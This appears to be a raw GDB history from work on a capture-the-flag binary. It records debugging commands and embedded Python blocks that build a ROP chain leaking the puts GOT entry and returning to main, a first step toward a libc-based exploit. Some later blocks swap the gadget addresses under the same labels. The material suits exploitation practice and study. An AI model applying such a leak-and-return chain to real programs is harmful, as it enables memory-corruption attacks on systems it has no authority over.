b *main
r
disass main
disass gifts
got puts
got
got@puts
plt@puts
got -h
got puts
got -p puts
got -r puts
python
pop_rax = 0x401203
mov_rdi_rax_puts = 0x4012da
puts_got = 0x403fc8
main = 0x4012e5
ret = 0x40101a

payload = []

payload.append(pop_rax)
payload.append(puts_got)
payload.append(mov_rdi_rax_puts)
payload.append(0)
payload.append(ret)
payload.append(main)

for i in range(21):
    r.sendlineafter(b"input:\n", b".")

for i in range(6):
    r.sendlineafter(b"input:\n", int_to_float_str(payload[i]))

for i in range(3):
    r.sendlineafter(b"input:\n", b".")
end
disass main
p/x rbp-0xa0
p/x $rbp-0xa0
p rbp-0xa0
p $rbp-0xa0
b *main+109
c
p $rbp-0xa0
python
pop_rax = 0x401203  # Replace with the actual address
puts_got = 0x4012da  # Replace with the actual address
mov_rdi_rax_puts = 0x403fc8  # Replace with the actual address
ret = 0x4012e5  # Address of a `ret` gadget
main = 0x40101a  # Address of the main function

# 페이로드 작성
payload = [
    pop_rax,
    puts_got,
    mov_rdi_rax_puts,
    0,
    ret,
    main
]

# 스택에 페이로드 쓰기 (추정 주소)
buffer_addr = 0x7fffffffe250  # Replace with actual stack address
gdb.execute(f"set *((long*){hex(buffer_addr)}) = {hex(payload[0])}")
for i, value in enumerate(payload[1:]):
    gdb.execute(f"set *((long*)({hex(buffer_addr + 8 * (i + 1))})) = {hex(value)}")
print("Payload written to stack")
end
p/x $rsp
x/10gx $rsp
x/10gx $rbp-0xa0
r
disass main
b *main+186
c
c
aaaaaaa
c
c
c
c
r
c
c
c
c
c
c
c
c
a
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
r
quit
b *main
r
disass main
b *main+186
c
2
quit
b *main
r
disass main
b *main+186
c
x/10gx $rsp
x/10gx $rsp-0x80
disass main
b *main+185
r
c
p $rbp
x/10gx $rbp
x/10gx $rbp-0x80
x/10gx $rbp-0xc0
x/10gx $rbp-0xa0
disass main
x/10gx $rbp-0xa0
x/10gx $rbp
x/10gx $rbp+8
python
pop_rax = 0x401203  # Replace with the actual address
puts_got = 0x4012da  # Replace with the actual address
mov_rdi_rax_puts = 0x403fc8  # Replace with the actual address
ret = 0x4012e5  # Address of a `ret` gadget
main = 0x40101a  # Address of the main function

# 페이로드 작성
payload = [
    pop_rax,
    puts_got,
    mov_rdi_rax_puts,
    0,
    ret,
    main
]

# 스택에 페이로드 쓰기 (추정 주소)
buffer_addr = 0x7fffffffe2f8  # Replace with actual stack address
gdb.execute(f"set *((long*){hex(buffer_addr)}) = {hex(payload[0])}")
for i, value in enumerate(payload[1:]):
    gdb.execute(f"set *((long*)({hex(buffer_addr + 8 * (i + 1))})) = {hex(value)}")
print("Payload written to stack")
end
x/10gx $rbp
ni
ni
ni
ni
ni
ni
ni
ni
disass gifts
r
c
r
echo -e "."*21 > input.txt
run < arguments > < input.txt
r
c
r
r
r
quit
b *main
r
disass main
b *main+185
r
c
r
c
.
python
pop_rax = 0x401203  # Replace with the actual address
puts_got = 0x403fc8  # Replace with the actual address
mov_rdi_rax_puts = 0x4012da  # Replace with the actual address
ret = 0x4012e5  # Address of a `ret` gadget
main = 0x40101a  # Address of the main function

# 페이로드 작성
payload = [
    pop_rax,
    puts_got,
    mov_rdi_rax_puts,
    0,
    ret,
    main
]

# 스택에 페이로드 쓰기 (추정 주소)
buffer_addr = 0x7fffffffe2f8  # Replace with actual stack address
gdb.execute(f"set *((long*){hex(buffer_addr)}) = {hex(payload[0])}")
for i, value in enumerate(payload[1:]):
    gdb.execute(f"set *((long*)({hex(buffer_addr + 8 * (i + 1))})) = {hex(value)}")
print("Payload written to stack")
end
x/10gx $rsp
ni
ni
ni
ni
ni
ni
disass gifts
quit
